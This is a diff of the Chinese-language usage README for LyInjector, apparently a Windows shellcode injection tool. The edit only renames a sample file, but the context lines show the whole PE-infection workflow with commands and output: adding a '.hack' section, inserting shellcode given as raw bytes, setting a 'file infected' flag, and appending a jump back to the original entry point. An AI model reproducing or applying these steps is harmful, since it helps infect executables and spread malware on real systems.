@@ -33,7 +33,7 @@
 Microsoft Windows [版本 10.0.19042.1826]
 (c) Microsoft Corporation。保留所有权利。
 
-C:\Users\admin>LyInjector
+C:\Users\admin> LyInjector
  _            ___        _           _
 | |   _   _  |_ _|_ __  (_) ___  ___| |_ ___  _ __
 | |  | | | |  | || '_ \ | |/ _ \/ __| __/ _ \| '__|
@@ -287,7 +287,7 @@ C:\Users\admin> LyInjector EncodePidInFile --pid 8384 --path d://xor_shellcode.t
 - AddSection 在PE文件中新增一个节区
 
 ```c
-C:\Users\admin> LyInjector AddSection --path d://test.exe --section .hack --size 1024
+C:\Users\admin> LyInjector AddSection --path d://lyshark.exe --section .hack --size 1024
 
 [-] 当前DOS头: 0x2130000
 [-] 当前NT头: 0x0000000002130108
@@ -302,7 +302,7 @@ C:\Users\admin> LyInjector AddSection --path d://test.exe --section .hack --size
 - InsertShellCode 将ShellCode插入到PE中的指定位置
 
 ```c
-C:\Users\admin> LyInjector InsertShellCode --path d://test.exe --shellcode d://shellcode.txt --offset 1233
+C:\Users\admin> LyInjector InsertShellCode --path d://lyshark.exe --shellcode d://shellcode.txt --offset 1233
 0xFC 0xE8 0x8F 0x00 0x00 0x00 0x60 0x31 0xD2 0x64 0x8B 0x52 0x30 0x8B 0x52 0x0C
 0x89 0xE5 0x8B 0x52 0x14 0x31 0xFF 0x0F 0xB7 0x4A 0x26 0x8B 0x72 0x28 0xF0 0xB5
 0xA2 0x56 0x6A 0x00 0x53 0xFF 0xD5
@@ -314,17 +314,17 @@ C:\Users\admin> LyInjector InsertShellCode --path d://test.exe --shellcode d://s
 - SetSigFlag 设置文件感染标志
 
 ```c
-C:\Users\admin> LyInjector SetSigFlag --path d://test.exe
+C:\Users\admin> LyInjector SetSigFlag --path d://lyshark.exe
 [+] 文件已感染
 
-C:\Users\admin> LyInjector SetSigFlag --path d://test.exe
+C:\Users\admin> LyInjector SetSigFlag --path d://lyshark.exe
 [-] 文件已被感染,无法重复感染.
 ```
 
 - RepairShellOep 在ShellCode末尾增加跳转回原地址处的指令
 
 ```c
-C:\Users\admin>LyInjector RepairShellOep --path d://test.exe --start_offset 1230 --end_offset 1240
+C:\Users\admin>LyInjector RepairShellOep --path d://lyshark.exe --start_offset 1230 --end_offset 1240
 
 [+] 获取原OEP => 0x000D8865
 [+] 在 ShellCode 尾部增加JMP跳转指令: 0x90 0x90 0x90 0x90 0xB8 0x65 0x88 0x0D 0x00 0xFF 0xE0 0x00 0x00 0x00 0x00
